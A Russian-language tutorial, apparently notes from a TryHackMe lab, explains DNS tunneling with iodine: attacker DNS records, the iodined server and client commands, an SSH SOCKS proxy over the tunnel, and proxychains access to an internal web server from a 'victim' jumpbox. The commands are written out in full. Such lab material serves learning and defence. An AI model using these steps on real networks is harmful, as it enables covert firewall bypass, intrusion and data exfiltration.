# DNS TUNNELING

## Что такое DNS Tunneling

**DNS Tunneling** — это метод, позволяющий передавать любые данные через DNS-протокол. По сути, это создание «туннеля» внутри DNS-запросов, через который можно передавать HTTP, SSH, FTP и другие протоколы.

**Аналогия:** Представь, что DNS — это обычная почтовая служба, которая доставляет только маленькие конверты. DNS Tunneling — это когда ты прячешь письмо с секретными данными внутри этих конвертов и отправляешь их. При этом получатель знает, как достать данные из конверта.


## Как это работает

1. Атакующий регистрирует домен (например, `att.tunnel.com`).
2. Настраивает DNS-сервер для приёма запросов.
3. На скомпрометированной машине запускается клиент, который отправляет DNS-запросы с закодированными данными.
4. Атакующий получает эти запросы, декодирует их и передаёт дальше (например, в интернет).
В результате создаётся «туннель» — скрытый канал связи.


## Когда это нужно

- Когда прямой доступ к интернету заблокирован (например, в корпоративной сети).
- Когда все порты закрыты, кроме DNS (порт 53).
- Когда нужно обойти фаервол или прокси.


## Что такое iodine

**iodine** — это инструмент для создания DNS-туннелей. Он состоит из двух частей:
- **iodined** — серверная часть (запускается на атакующей машине).
- **iodine** — клиентская часть (запускается на жертве).


## Подготовка: DNS-записи

Чтобы iodine работал, нужно настроить DNS-записи:

1. **A-запись** — указывает на IP атакующей машины.
2. **NS-запись** — указывает, какой сервер отвечает за поддомен.

**Пример:**
- `attNS.tunnel.com` → A → `172.20.0.200`
- `att.tunnel.com` → NS → `attNS.tunnel.com`


## Архитектура: кто есть кто

| Компонент | Роль | IP/Домен |
|-----------|------|----------|
| **Атакующий (Attacker)** | Серверная часть (iodined) | `att.tunnel.com` (172.20.0.200) |
| **Жертва (JumpBox)** | Клиентская часть (iodine) | Подключается к `att.tunnel.com` |
| **Цель (Internal Web)** | Веб-сервер внутри сети | `192.168.0.100` |



## Пошаговый разбор команды

### 1. Серверная часть (Attacker / атакующий)

```bash
sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com
```

**Что происходит:**
- `iodined` — запускает DNS-сервер для приёма запросов.
- `-f` — работает в фоне (не в фоне, а в текущем терминале).
- `-c` — не проверяет IP клиента.
- `-P thmpass` — пароль для аутентификации.
- `10.1.1.1/24` — создаётся виртуальная сеть. Сервер получает IP `10.1.1.1`, клиент `10.1.1.2`.
- `att.tunnel.com` — домен, на который будут приходить запросы.

**Результат:** Создаётся виртуальный интерфейс `dns0` с IP `10.1.1.1`.

### 2. Клиентская часть (JumpBox / жертва)

```bash
sudo iodine -P thmpass att.tunnel.com
```

**Что происходит:**
- `iodine` — подключается к серверу через DNS.
- `-P thmpass` — пароль.
- `att.tunnel.com` — домен, на который отправлять запросы.

**Результат:** Создаётся виртуальный интерфейс `dns0` с IP `10.1.1.2`.

Теперь есть соединение между `10.1.1.1` (атакующий) и `10.1.1.2` (жертва) через DNS-туннель.


### 3. SSH через туннель (с атакующей машины)

```bash
ssh thm@10.1.1.2 -4 -f -N -D 1080
```

**Что происходит:**
- SSH подключается к `10.1.1.2` (жертва) через DNS-туннель.
- `-D 1080` — создаёт SOCKS5-прокси на порту 1080.
- `-f` — работает в фоне.
- `-N` — без выполнения команд (только туннель).

**Результат:** На локальной машине появился SOCKS-прокси (`127.0.0.1:1080`).


### 4. Доступ к внутренним ресурсам

```bash
proxychains curl http://192.168.0.100/demo.php
```

**Что происходит:**
- `proxychains` перенаправляет трафик через SOCKS-прокси (`127.0.0.1:1080`).
- Трафик идёт через DNS-туннель к JumpBox и дальше во внутреннюю сеть.

**Результат:** Доступ к внутреннему веб-серверу, который недоступен напрямую.


## Что даёт DNS-туннель

| Что было до туннеля | Что стало после |
|---------------------|-----------------|
| Прямой доступ к `192.168.0.100` отсутствует | Доступ есть через туннель |
| Трафик ограничен только HTTP/HTTPS | Можно передавать любые данные |
| DNS-запросы видны, но не блокируются | Трафик скрыт внутри DNS |


## Почему это работает

- DNS-трафик разрешён почти везде.
- DNS-запросы редко проверяют на наличие скрытых данных.
- Туннель выглядит как обычная активность.
